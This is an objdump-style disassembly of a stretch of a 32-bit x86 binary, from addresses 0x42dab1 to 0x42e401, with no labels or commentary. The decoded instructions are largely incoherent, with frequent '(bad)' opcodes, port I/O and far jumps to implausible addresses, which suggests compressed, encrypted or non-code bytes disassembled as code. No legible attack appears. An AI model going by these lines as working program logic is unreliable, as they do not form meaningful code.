  42dab1:	out    0x79,al
  42dab3:	pushf  
  42dab4:	sahf   
  42dab5:	cdq    
  42dab6:	das    
  42dab7:	popa   
  42dab8:	mov    ds:0xabf64d00,al
  42dabd:	out    dx,al
  42dabe:	xor    edi,ecx
  42dac0:	push   eax
  42dac1:	scas   al,BYTE PTR es:[edi]
  42dac2:	ss mov ah,0x16
  42dac5:	outs   dx,DWORD PTR ds:[esi]
  42dac6:	xlat   BYTE PTR ds:[ebx]
  42dac7:	or     eax,0x65f4434a
  42dacc:	mov    ah,0xd8
  42dace:	jp     0x42daa3
  42dad0:	enter  0x6f3d,0x9f
  42dad4:	inc    ebp
  42dad5:	xchg   ecx,eax
  42dad6:	or     DWORD PTR ds:0xbe1771bf,0x43
  42dadd:	jp     0x42da90
  42dadf:	ja     0x42daee
  42dae1:	adc    dh,0xc4
  42dae4:	mov    edi,0xa0e0c890
  42dae9:	add    DWORD PTR [edx],edx
  42daeb:	frstor [eax-0x77e0b83a]
  42daf1:	mov    ch,0xd7
  42daf3:	outs   dx,BYTE PTR ds:[esi]
  42daf4:	div    cl
  42daf6:	cmc    
  42daf7:	cs (bad) 
  42daf9:	das    
  42dafa:	leave  
  42dafb:	out    0x4e,al
  42dafd:	lods   eax,DWORD PTR ds:[esi]
  42dafe:	push   0xce50af65
  42db03:	pop    ecx
  42db04:	mov    ebx,0x81004a84
  42db09:	add    DWORD PTR [ebx],eax
  42db0b:	cmp    BYTE PTR [esi+0x4e],dh
  42db0e:	jns    0x42daac
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db17
  42db81:	mov    dh,0x31
  42db83:	adc    al,0x28
  42db85:	jmp    0x146db8b
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	mov    edx,0xe9bb391d
  42db91:	outs   dx,DWORD PTR ds:[esi]
  42db92:	jp     0x42dbcb
  42db94:	enter  0xcfa8,0x88
  42db98:	sti    
  42db99:	and    bl,BYTE PTR [ecx-0x47]
  42db9c:	mov    ch,BYTE PTR [edi+0x553765bf]
  42dba2:	inc    esp
  42dba3:	jl     0x42db9b
  42dba5:	in     al,0x62
  42dba7:	jae    0x42db86
  42dba9:	jno    0x42dbe0
  42dbab:	push   ebx
  42dbac:	jnp    0x42db36
  42dbae:	mov    al,ds:0xfcd699fd
  42dbb3:	rol    BYTE PTR [esi],1
  42dbb5:	adc    al,0xb0
  42dbb7:	cmp    dh,dh
  42dbb9:	cmp    bh,ah
  42dbbb:	xchg   edx,eax
  42dbbc:	lds    esp,FWORD PTR [ecx]
  42dbbe:	imul   eax,DWORD PTR [esi],0x36bb79d2
  42dbc4:	leave  
  42dbc5:	adc    BYTE PTR [ecx+0x72f608ea],dl
  42dbcb:	(bad)  
  42dbcc:	fisubr WORD PTR [edx+0xa6b5922]
  42dbd2:	adc    eax,edx
  42dbd4:	sbb    BYTE PTR [ecx],ah
  42dbd6:	cmp    cl,ch
  42dbd8:	popa   
  42dbd9:	sahf   
  42dbda:	dec    ebx
  42dbdb:	montmul (bad)
  42dbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbdd:	(bad)
  42dbe0:	inc    eax
  42dbe1:	int3   
  42dbe2:	pop    ecx
  42dbe3:	jns    0x42dbce
  42dbe5:	inc    esi
  42dbe6:	dec    ebp
  42dbe7:	xchg   edi,eax
  42dbe8:	and    ebp,DWORD PTR [esi]
  42dbea:	repz jnp 0x42db9c
  42dbed:	shl    cl,1
  42dbef:	loopne 0x42dc6b
  42dbf1:	not    DWORD PTR [ebx]
  42dbf3:	out    dx,eax
  42dbf4:	pop    eax
  42dbf5:	push   0x79436e8f
  42dbfa:	stos   DWORD PTR es:[edi],eax
  42dbfb:	punpckldq mm0,DWORD PTR [eax]
  42dbfe:	leave  
  42dbff:	cs std 
  42dc01:	fstp   QWORD PTR [ebx-0x58c87b72]
  42dc07:	sub    al,0x58
  42dc09:	jbe    0x42dc0f
  42dc0b:	das    
  42dc0c:	rol    BYTE PTR [ebx+ecx*4],cl
  42dc0f:	add    al,0x64
  42dc11:	or     al,0x6f
  42dc13:	push   ebx
  42dc14:	xchg   esi,eax
  42dc15:	pop    edi
  42dc16:	xor    DWORD PTR [ebp+0x51d2616],esp
  42dc1c:	mov    ds,ebp
  42dc1e:	mov    ch,0x7d
  42dc20:	jmp    0x79377f58
  42dc25:	sbb    DWORD PTR [esi],ecx
  42dc27:	and    eax,0xb00736ec
  42dc2c:	(bad)  
  42dc2d:	mov    ds:0x78e94d0,eax
  42dc32:	rcl    ebp,cl
  42dc34:	mov    ds:0xe20e31,eax
  42dc39:	(bad)  
  42dc3a:	cld    
  42dc3b:	mov    ds:0xc30bac89,eax
  42dc40:	into   
  42dc41:	push   cs
  42dc42:	aaa    
  42dc43:	cld    
  42dc44:	jmp    0x69bc84f0
  42dc49:	mul    BYTE PTR [ecx-0x78e5df81]
  42dc4f:	or     eax,0xdcb6390f
  42dc54:	mov    ebx,0xdbd6bafc
  42dc59:	int    0xdb
  42dc5b:	xlat   BYTE PTR ds:[ebx]
  42dc5c:	inc    ecx
  42dc5d:	das    
  42dc5e:	bnd jno 0x42dc34
  42dc61:	xchg   esi,eax
  42dc62:	pop    edi
  42dc63:	les    ebx,FWORD PTR [ebp+0x452da331]
  42dc69:	sbb    DWORD PTR [ebx-0x5d],0xffffffb2
  42dc6d:	mov    ds:0x4ae538de,al
  42dc72:	adc    BYTE PTR [ebx],0xff
  42dc75:	es ret 
  42dc77:	lahf   
  42dc78:	lahf   
  42dc79:	cwde   
  42dc7a:	scas   al,BYTE PTR es:[edi]
  42dc7b:	mov    bh,0xfe
  42dc7d:	xor    BYTE PTR [edi],ah
  42dc7f:	cwde   
  42dc80:	sar    al,1
  42dc82:	or     al,0x7d
  42dc84:	and    bl,al
  42dc86:	inc    ebx
  42dc87:	and    DWORD PTR [ebx+ebp*4-0x6954dc05],0x17a
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	mov    bl,0x86
  42dd03:	out    0x2c,al
  42dd05:	jmp    0x0:0x1040001
  42dd0c:	sbb    ebp,DWORD PTR [esi+ebp*2]
  42dd0f:	popf   
  42dd10:	out    dx,al
  42dd11:	mov    eax,ds:0x3a581f3f
  42dd16:	lods   al,BYTE PTR ds:[esi]
  42dd17:	pop    edi
  42dd18:	inc    eax
  42dd19:	outs   dx,BYTE PTR ds:[esi]
  42dd1a:	sar    BYTE PTR [ebx-0x108e69a9],cl
  42dd20:	push   ds
  42dd21:	jb     0x42dd49
  42dd23:	jb     0x42dd54
  42dd25:	lahf   
  42dd26:	jns    0x42dd21
  42dd28:	add    BYTE PTR [eax-0x73],dl
  42dd2b:	outs   dx,DWORD PTR ds:[esi]
  42dd2c:	inc    esp
  42dd2d:	pop    ebx
  42dd2e:	rcr    DWORD PTR [ecx-0x23cc1a2c],0xa9
  42dd35:	call   0xeda0e76f
  42dd3a:	ins    DWORD PTR es:[edi],dx
  42dd3b:	(bad)  
  42dd3c:	loopne 0x42dcc8
  42dd3e:	and    dl,ch
  42dd40:	jp     0x42ddb6
  42dd42:	jnp    0x42dd44
  42dd44:	or     al,0x1a
  42dd46:	aad    0x51
  42dd48:	in     al,dx
  42dd49:	arpl   cx,bp
  42dd4b:	push   ecx
  42dd4c:	ret    0x210
  42dd4f:	in     al,0x97
  42dd51:	mov    ecx,0xef7715c1
  42dd56:	xchg   DWORD PTR [ecx-0x79c34ac8],edi
  42dd5c:	loop   0x42ddbd
  42dd5e:	js     0x42dd64
  42dd60:	push   ecx
  42dd61:	test   BYTE PTR [ebx],al
  42dd63:	je     0x42dd7f
  42dd65:	cmp    al,0x1c
  42dd67:	pop    es
  42dd68:	in     eax,0x36
  42dd6a:	mov    ebp,0x249b32cd
  42dd6f:	and    DWORD PTR [eax+edx*2+0x4c90feb7],eax
  42dd76:	xchg   cl,bh
  42dd78:	xchg   edi,eax
  42dd79:	jnp    0x42dd04
  42dd7b:	jne    0x42ddf0
  42dd7d:	leave  
  42dd7e:	adc    ah,BYTE PTR [esi+0x79b5e9f6]
  42dd84:	mov    DWORD PTR [ebx-0x3ae489a5],edi
  42dd8a:	fld    st(4)
  42dd8c:	mov    fs,WORD PTR [edx]
  42dd8e:	stc    
  42dd8f:	sar    BYTE PTR [edx+0x2b],0xfe
  42dd93:	push   eax
  42dd94:	aaa    
  42dd95:	ret    0x644
  42dd98:	je     0x42ddd3
  42dd9a:	(bad)  
  42dd9b:	lods   eax,DWORD PTR ds:[esi]
  42dd9c:	(bad)  
  42dd9d:	ror    BYTE PTR [edi+0x754f6726],cl
  42dda3:	(bad)  
  42dda4:	outs   dx,DWORD PTR ds:[esi]
  42dda5:	inc    ebp
  42dda6:	jae    0x42ddc9
  42dda8:	push   es
  42dda9:	xchg   ebx,eax
  42ddaa:	scas   eax,DWORD PTR es:[edi]
  42ddab:	mov    esi,0x6c68ef29
  42ddb0:	cmp    DWORD PTR [edx],ebx
  42ddb2:	jns    0x42dd9a
  42ddb4:	inc    esp
  42ddb5:	dec    eax
  42ddb6:	xlat   BYTE PTR ds:[ebx]
  42ddb7:	jns    0x42de26
  42ddb9:	mov    eax,0xeaa68017
  42ddbe:	jae    0x42dd4f
  42ddc0:	mov    ds:0xc10d9682,al
  42ddc5:	mov    DWORD PTR [ebx],esi
  42ddc7:	cwde   
  42ddc8:	xchg   esi,eax
  42ddc9:	add    eax,0x9ce29c20
  42ddce:	enter  0x2625,0xda
  42ddd2:	sub    cl,BYTE PTR [edi+eax*2-0x3bb0e2cb]
  42ddd9:	xchg   esi,eax
  42ddda:	xor    al,0xd
  42dddc:	scas   al,BYTE PTR es:[edi]
  42dddd:	push   eax
  42ddde:	jno    0x42de2e
  42dde0:	js     0x42de42
  42dde2:	ret    
  42dde3:	ret    
  42dde4:	retf   
  42dde5:	jbe    0x42de0c
  42dde7:	jp     0x42ddf1
  42dde9:	aas    
  42ddea:	add    bl,BYTE PTR [ebx]
  42ddec:	dec    esp
  42dded:	mov    DWORD PTR [edi],0x8eb48d90
  42ddf3:	mov    ebp,0x1b7ba236
  42ddf8:	jecxz  0x42dd85
  42ddfa:	xor    al,0xfb
  42ddfc:	stos   BYTE PTR es:[edi],al
  42ddfd:	in     eax,dx
  42ddfe:	fsubr  DWORD PTR [esi+0x4b]
  42de01:	nop
  42de02:	jg     0x42de4d
  42de04:	lock ins BYTE PTR es:[edi],dx
  42de06:	dec    esi
  42de07:	xlat   BYTE PTR ds:[ebx]
  42de08:	rcl    BYTE PTR [edi+0x59f92ac4],1
  42de0e:	nop
  42de0f:	and    al,0x0
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	ds push ebx
  42de82:	jecxz  0x42de50
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	sbb    dh,bl
  42de8e:	pop    ds
  42de8f:	nop
  42de90:	stos   BYTE PTR es:[edi],al
  42de91:	(bad)  
  42de92:	sti    
  42de93:	adc    ah,0x1f
  42de96:	xlat   BYTE PTR ds:[ebx]
  42de97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de98:	ins    DWORD PTR es:[edi],dx
  42de99:	fcomp  DWORD PTR [esi+0x7c]
  42de9c:	retf   
  42de9d:	cmp    al,0xa3
  42de9f:	xchg   ebx,eax
  42dea0:	imul   BYTE PTR [ebp+eiz*4-0xcb8d508]
  42dea7:	push   cs
  42dea8:	cmovnp ecx,DWORD PTR [edi+ebp*4]
  42deac:	xor    ebx,DWORD PTR [ebx+0x20]
  42deaf:	ret    
  42deb0:	ss cld 
  42deb2:	jo     0x42dec6
  42deb4:	ins    DWORD PTR es:[edi],dx
  42deb5:	xchg   DWORD PTR [esi+0x74674202],ecx
  42debb:	add    eax,0xf7936e69
  42dec0:	and    BYTE PTR [ecx+0x77],dh
  42dec3:	scas   eax,DWORD PTR es:[edi]
  42dec4:	popa   
  42dec5:	loope  0x42deae
  42dec7:	xchg   edx,eax
  42dec8:	lea    esp,[ecx*4-0x178ff6e8]
  42decf:	sub    BYTE PTR [ebx],dl
  42ded1:	xchg   ebp,eax
  42ded2:	mov    ds:0x46d03c2c,al
  42ded7:	dec    ecx
  42ded8:	mov    ebp,0x93b1751c
  42dedd:	or     al,0x94
  42dedf:	mov    bl,0xe0
  42dee1:	mov    edi,0x74db808e
  42dee6:	xchg   esi,eax
  42dee7:	mov    es,edi
  42dee9:	jmp    0x8a9f:0x567c58f3
  42def0:	dec    ecx
  42def1:	xor    eax,0xd94b7246
  42def6:	ins    DWORD PTR es:[edi],dx
  42def7:	inc    ebx
  42def8:	mov    BYTE PTR [ecx-0x1f],al
  42defb:	loopne 0x42df05
  42defd:	xor    eax,esp
  42deff:	cmc    
  42df00:	pop    esi
  42df01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df02:	icebp  
  42df03:	jle    0x42dedf
  42df05:	call   0x385475df
  42df0a:	loop   0x42df64
  42df0c:	les    esp,FWORD PTR [ebx]
  42df0e:	scas   eax,DWORD PTR es:[edi]
  42df0f:	ror    DWORD PTR [ebx-0x67],0xd7
  42df13:	sbb    bh,dh
  42df15:	shl    bh,cl
  42df17:	cld    
  42df18:	ss test al,al
  42df1b:	adc    bh,BYTE PTR [ecx-0x390ffb15]
  42df21:	xchg   ebx,eax
  42df22:	push   cs
  42df23:	int    0x6d
  42df25:	mov    ebp,0xd3b7a09b
  42df2a:	ret    
  42df2b:	mov    ds:0x3b3fccb7,eax
  42df30:	mov    BYTE PTR [esi],cl
  42df32:	lods   al,BYTE PTR ds:[esi]
  42df33:	test   DWORD PTR [ebx+0x39],ebx
  42df36:	cmp    bl,BYTE PTR [eax+0x1c134220]
  42df3c:	stos   BYTE PTR es:[edi],al
  42df3d:	imul   ebx,DWORD PTR [eax+edi*8+0x31],0x9e4cb7f5
  42df45:	lock adc cl,BYTE PTR [eax]
  42df48:	inc    esi
  42df49:	ror    BYTE PTR [esp+esi*1+0x49],0xa
  42df4e:	jns    0x42df44
  42df50:	xor    al,0x41
  42df52:	aad    0xc7
  42df54:	cmp    bh,ah
  42df56:	inc    edx
  42df57:	cdq    
  42df58:	arpl   WORD PTR [ebx-0x44],si
  42df5b:	xlat   BYTE PTR ds:[ebx]
  42df5c:	cmp    DWORD PTR [ebx],0x1b
  42df5f:	sub    al,0xb8
  42df61:	pusha  
  42df62:	out    dx,al
  42df63:	ins    BYTE PTR es:[edi],dx
  42df64:	mov    ds:0x9176891b,eax
  42df69:	inc    esp
  42df6a:	outs   dx,BYTE PTR ds:[esi]
  42df6b:	sbb    ebp,eax
  42df6d:	out    0x8c,al
  42df6f:	mov    al,0x6e
  42df71:	sub    esp,DWORD PTR [ebx]
  42df73:	inc    esi
  42df74:	jg     0x42dfe3
  42df76:	add    DWORD PTR [edi-0x19bb9f8e],0xfc2c8dcb
  42df80:	in     eax,0xdc
  42df82:	test   eax,0x4c0878c5
  42df87:	out    dx,eax
  42df88:	cmp    cl,BYTE PTR [esi+0x794fc080]
  42df8e:	jae    0x42df5a
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x1b]
  42e001:	dec    ebp
  42e002:	jnp    0x42dfca
  42e004:	xor    al,0xec
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    al,0x1
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	jl     0x42dffa
  42e00e:	ins    DWORD PTR es:[edi],dx
  42e00f:	xchg   BYTE PTR [eax+0x458b4541],ch
  42e015:	inc    edx
  42e016:	mov    edi,0x8612b52b
  42e01b:	mov    dh,0xce
  42e01d:	or     eax,0x6d3c2302
  42e022:	pop    ebx
  42e023:	mov    BYTE PTR [edi],ch
  42e025:	mov    esp,0xbd0ba9f2
  42e02a:	lods   eax,DWORD PTR ds:[esi]
  42e02b:	jmp    0x6fea4e90
  42e030:	jl     0x42dfd0
  42e032:	cmp    bl,ah
  42e034:	xchg   BYTE PTR [ebp+0x1a],bh
  42e037:	mov    edi,0x3f3e516
  42e03c:	sub    al,BYTE PTR [ecx-0x45]
  42e03f:	sub    ebp,edi
  42e041:	out    dx,eax
  42e042:	dec    ecx
  42e043:	xor    esp,ebx
  42e045:	(bad)  
  42e046:	fimul  WORD PTR [edx]
  42e048:	js     0x42dfd5
  42e04a:	leave  
  42e04b:	xlat   BYTE PTR ds:[ebx]
  42e04c:	dec    ebx
  42e04d:	pushf  
  42e04e:	xor    eax,edx
  42e050:	jnp    0x42e044
  42e052:	mov    esp,0x90a2e030
  42e057:	pop    ecx
  42e058:	jno    0x42e09a
  42e05a:	pop    ecx
  42e05b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e05c:	stos   BYTE PTR es:[edi],al
  42e05d:	add    eax,0x48dd4ad9
  42e062:	popa   
  42e063:	or     DWORD PTR [esi],0x60
  42e066:	cmp    BYTE PTR [edx+0x4252e58d],al
  42e06c:	rol    BYTE PTR [eax+ebx*4+0x7c],1
  42e070:	(bad)  
  42e071:	(bad)  
  42e072:	cmc    
  42e073:	retf   0x21d1
  42e076:	pop    ecx
  42e077:	inc    esi
  42e078:	bound  edx,QWORD PTR [esi-0x55ee1c3e]
  42e07e:	push   eax
  42e07f:	adc    BYTE PTR [eax+0x17],al
  42e082:	jb     0x42e0d1
  42e084:	out    0x60,al
  42e086:	mov    ebx,0x41632057
  42e08b:	pop    es
  42e08c:	pusha  
  42e08d:	in     al,0xc7
  42e08f:	int3   
  42e090:	popf   
  42e091:	xchg   edx,eax
  42e092:	in     eax,dx
  42e093:	imul   edi,DWORD PTR [ebx+eax*1-0x52cac5ff],0xffffff8d
  42e09b:	add    eax,0x1a52da9e
  42e0a0:	xchg   BYTE PTR [edx-0x2ed9bf6b],dh
  42e0a6:	jge    0x42e10f
  42e0a8:	push   esp
  42e0a9:	je     0x42e039
  42e0ab:	shl    DWORD PTR [ebp-0x61],1
  42e0ae:	dec    ebp
  42e0af:	inc    ebx
  42e0b0:	mov    bl,0x82
  42e0b2:	pop    eax
  42e0b3:	dec    edi
  42e0b4:	sub    al,0xca
  42e0b6:	mov    ds:0x454cddae,eax
  42e0bb:	sub    BYTE PTR [ebx],ah
  42e0bd:	jg     0x42e08e
  42e0bf:	(bad)  
  42e0c0:	push   ss
  42e0c1:	and    al,0x78
  42e0c3:	lds    ecx,FWORD PTR [edi]
  42e0c5:	sub    DWORD PTR [ebx],ebx
  42e0c7:	xchg   esi,eax
  42e0c8:	xchg   esi,eax
  42e0c9:	add    BYTE PTR [ecx-0x1f1d2a52],cl
  42e0cf:	add    BYTE PTR [eax],al
  42e0d1:	in     al,dx
  42e0d2:	add    dl,BYTE PTR [eax-0x5eb70369]
  42e0d8:	sub    cl,BYTE PTR [ebx-0xda8d3c2]
  42e0de:	pop    ds
  42e0df:	xor    BYTE PTR [esi+0x6b1a9741],cl
  42e0e5:	mov    ch,0xb
  42e0e7:	sub    cl,bh
  42e0e9:	(bad)  
  42e0eb:	inc    eax
  42e0ec:	pop    edx
  42e0ed:	hlt    
  42e0ee:	xor    edi,esi
  42e0f0:	sub    al,0xf3
  42e0f2:	jo     0x42e117
  42e0f4:	fcomip st,st(1)
  42e0f6:	arpl   WORD PTR [edx],dx
  42e0f8:	aam    0x77
  42e0fa:	jno    0x42e0bd
  42e0fc:	ror    BYTE PTR [edi+0x59],cl
  42e0ff:	xchg   ebp,eax
  42e100:	icebp  
  42e101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e102:	rcl    BYTE PTR [edi+0x1a41f802],1
  42e108:	mov    esp,0x7fe5963e
  42e10d:	sub    ah,al
  42e10f:	in     eax,0x0
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	xchg   edi,eax
  42e181:	xchg   ecx,eax
  42e182:	fst    QWORD PTR [edx+0x1ed38]
  42e188:	add    al,0x1
  42e18a:	add    BYTE PTR [eax],al
  42e18c:	xchg   edx,eax
  42e18d:	cld    
  42e18e:	addr16 xchg esp,eax
  42e190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e191:	f2xm1  
  42e193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e194:	in     eax,dx
  42e195:	popf   
  42e196:	bound  edi,QWORD PTR [edx]
  42e198:	pop    eax
  42e199:	(bad)  
  42e19a:	and    ecx,DWORD PTR [esi+eax*1+0x322fb5b9]
  42e1a1:	mov    cl,0x2a
  42e1a3:	xchg   ecx,eax
  42e1a4:	add    DWORD PTR [eax-0x1d0b9a5a],edi
  42e1aa:	sub    al,0x1b
  42e1ac:	push   cs
  42e1ad:	fcmovnb st,st(1)
  42e1af:	stc    
  42e1b0:	mov    ch,0xa7
  42e1b2:	clc    
  42e1b3:	int    0x55
  42e1b5:	(bad)  
  42e1b6:	in     eax,0xe7
  42e1b8:	xor    eax,ecx
  42e1ba:	repz (bad) 
  42e1bc:	push   ds
  42e1bd:	push   cs
  42e1be:	push   esi
  42e1bf:	xor    cl,BYTE PTR [ecx]
  42e1c1:	dec    esi
  42e1c2:	jmp    0x42e1dd
  42e1c4:	test   BYTE PTR ds:0x73d30dd,cl
  42e1ca:	push   ss
  42e1cb:	stc    
  42e1cc:	aad    0xcb
  42e1ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1cf:	sub    DWORD PTR [eax],edx
  42e1d1:	lods   al,BYTE PTR ds:[esi]
  42e1d2:	ja     0x42e1f4
  42e1d4:	in     al,0x73
  42e1d6:	adc    edi,edx
  42e1d8:	mov    edi,ebx
  42e1da:	jmp    FWORD PTR [eax]
  42e1dc:	js     0x42e1a3
  42e1de:	pusha  
  42e1df:	repz push edi
  42e1e1:	int3   
  42e1e2:	mov    eax,ds:0xfdc3fdf2
  42e1e7:	mov    edi,0x138eb2d0
  42e1ec:	xchg   edx,eax
  42e1ed:	idiv   BYTE PTR [eax+esi*1+0x3c41076c]
  42e1f4:	lods   eax,DWORD PTR ds:[esi]
  42e1f5:	ds cli 
  42e1f7:	dec    ebx
  42e1f8:	xchg   esp,eax
  42e1f9:	fsub   DWORD PTR [esi-0x3e855e8b]
  42e1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e200:	call   0x92c2:0xab5c20bb
  42e207:	scas   al,BYTE PTR es:[edi]
  42e208:	mov    ebp,0xbc56f09b
  42e20d:	loopne 0x42e20e
  42e20f:	data16 hlt 
  42e211:	xor    ebx,0x30398318
  42e217:	add    ecx,DWORD PTR ds:0x39d9c1b2
  42e21d:	sub    esp,DWORD PTR [ecx+esi*8-0x43]
  42e221:	add    al,dl
  42e223:	in     al,0xce
  42e225:	test   al,0xe
  42e227:	imul   dl
  42e229:	jb     0x42e219
  42e22b:	shr    dh,cl
  42e22d:	push   0x16
  42e22f:	ret    
  42e230:	adc    eax,0xd216b371
  42e235:	test   al,0x42
  42e237:	mov    ebx,0xa27339ad
  42e23c:	mov    WORD PTR [esp+esi*4+0x1aae7940],?
  42e243:	pushf  
  42e244:	add    al,0x84
  42e246:	int    0x83
  42e248:	xchg   edi,eax
  42e249:	jl     0x42e22f
  42e24b:	dec    edi
  42e24c:	cmp    cl,bh
  42e24e:	mov    ds:0x38bce28,al
  42e253:	popf   
  42e254:	(bad)  
  42e255:	adc    DWORD PTR [ecx-0x18],edx
  42e258:	loop   0x42e2a7
  42e25a:	into   
  42e25b:	mov    eax,0xc72904d3
  42e260:	adc    eax,0x24a53a6c
  42e265:	sahf   
  42e266:	cmp    esp,DWORD PTR [edi]
  42e268:	and    edx,DWORD PTR [ebx-0x5c147d0e]
  42e26e:	dec    DWORD PTR [ecx-0x15]
  42e271:	js     0x42e226
  42e273:	es sti 
  42e275:	mov    ds,WORD PTR [ecx-0x3c]
  42e278:	and    eax,0x8caf693b
  42e27d:	pop    ebx
  42e27e:	das    
  42e27f:	je     0x42e2fc
  42e281:	pop    ds
  42e282:	mov    BYTE PTR [esi-0x8ee801b],ah
  42e288:	aam    0x59
  42e28a:	fldl2t 
  42e28c:	cdq    
  42e28d:	je     0x42e21c
  42e28f:	sbb    BYTE PTR [eax],al
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x90199140
  42e301:	je     0x42e376
  42e303:	xchg   esp,eax
  42e304:	cmp    al,0xee
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    al,0x1
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	sub    cl,BYTE PTR [edx]
  42e30e:	repnz mov ah,0x27
  42e311:	inc    edi
  42e312:	xchg   edx,eax
  42e313:	fiadd  WORD PTR [ecx-0x9]
  42e316:	pop    ss
  42e317:	pop    esi
  42e318:	sbb    DWORD PTR [ecx-0x66],edx
  42e31b:	push   esi
  42e31c:	sti    
  42e31d:	out    0x53,al
  42e31f:	mov    ebx,0x552eb8ab
  42e324:	mov    esp,DWORD PTR [eax-0x5fd55827]
  42e32a:	inc    esp
  42e32b:	push   edi
  42e32c:	push   cs
  42e32d:	das    
  42e32e:	rcl    DWORD PTR gs:[edi+0x3981df2b],0xc1
  42e336:	scas   al,BYTE PTR es:[edi]
  42e337:	mov    bl,BYTE PTR [edx-0x3a735f6d]
  42e33d:	outs   dx,BYTE PTR ds:[esi]
  42e33e:	fstp   QWORD PTR [esi-0x1b]
  42e341:	sahf   
  42e342:	pop    edx
  42e343:	stc    
  42e344:	xchg   ecx,eax
  42e345:	and    eax,0x8531f626
  42e34a:	lea    ecx,[eax]
  42e34c:	sahf   
  42e34d:	arpl   WORD PTR [ebx+ecx*1],ax
  42e350:	fdiv   QWORD PTR [ebx-0x7f]
  42e353:	add    eax,0x2a8a63be
  42e358:	mov    BYTE PTR [edx+0x6e],cl
  42e35b:	int    0xc7
  42e35d:	xchg   edi,eax
  42e35e:	add    eax,0xa8224aac
  42e363:	cmp    eax,DWORD PTR es:[ebx+0x0]
  42e367:	mov    esi,0x3449c4b
  42e36c:	test   BYTE PTR [eax-0x3c],ah
  42e36f:	add    dh,BYTE PTR [esi+0x57308ed1]
  42e375:	push   eax
  42e376:	(bad)  
  42e378:	inc    edi
  42e379:	nop
  42e37a:	cmp    DWORD PTR [edi+0x2cebcd0f],0xffffffc3
  42e381:	rcl    esp,cl
  42e383:	jp     0x42e3f8
  42e385:	sbb    ch,BYTE PTR [ecx]
  42e387:	mov    ds:0xf9b39c2f,al
  42e38c:	pop    edi
  42e38d:	jle    0x42e316
  42e38f:	fwait
  42e390:	jno    0x42e3d2
  42e392:	mov    eax,ds:0x76e80a05
  42e397:	inc    esp
  42e398:	icebp  
  42e399:	sti    
  42e39a:	dec    ebx
  42e39b:	scas   eax,DWORD PTR es:[edi]
  42e39c:	cmp    edi,esp
  42e39e:	pop    edi
  42e39f:	fcomp  DWORD PTR [ebp+0x38491871]
  42e3a5:	jns    0x42e3c3
  42e3a7:	xlat   BYTE PTR ds:[ebx]
  42e3a8:	sub    DWORD PTR [esi+ecx*4],esp
  42e3ab:	cmp    ch,bl
  42e3ad:	and    eax,0xa3484571
  42e3b2:	mov    BYTE PTR [esi+0x66],ch
  42e3b5:	cwde   
  42e3b6:	jne    0x42e36c
  42e3b8:	dec    edi
  42e3b9:	dec    ebp
  42e3ba:	mov    edx,0x703bf011
  42e3bf:	addr16 aaa 
  42e3c1:	in     al,dx
  42e3c2:	in     al,0x0
  42e3c4:	nop
  42e3c5:	cwde   
  42e3c6:	cld    
  42e3c7:	not    BYTE PTR [eax+edx*1]
  42e3ca:	jb     0x42e443
  42e3cc:	dec    ebp
  42e3cd:	jge    0x42e397
  42e3cf:	jb     0x42e3b4
  42e3d1:	fidivr WORD PTR [ebx+ebp*2]
  42e3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3d5:	and    ah,BYTE PTR ds:0x8886760
  42e3db:	inc    edi
  42e3dc:	mov    ecx,0xbeb79f98
  42e3e1:	xchg   ecx,eax
  42e3e2:	xchg   ebx,eax
  42e3e3:	push   ds
  42e3e4:	jg     0x42e3d4
  42e3e6:	(bad)  
  42e3e8:	jmp    0x42e449
  42e3ea:	das    
  42e3eb:	xlat   BYTE PTR ds:[ebx]
  42e3ec:	lods   eax,DWORD PTR ds:[esi]
  42e3ed:	push   ss
  42e3ee:	stos   BYTE PTR es:[edi],al
  42e3ef:	mov    ch,0x1c
  42e3f1:	sbb    DWORD PTR [esi+ecx*8+0x47],ebx
  42e3f5:	bound  edx,QWORD PTR [edi+ecx*8]
  42e3f8:	sbb    dl,BYTE PTR [ebp+0x394119d0]
  42e3fe:	stos   DWORD PTR es:[edi],eax
  42e3ff:	xor    DWORD PTR [edx],edx
  42e401:	imul   edi,ebx,0xffffffda
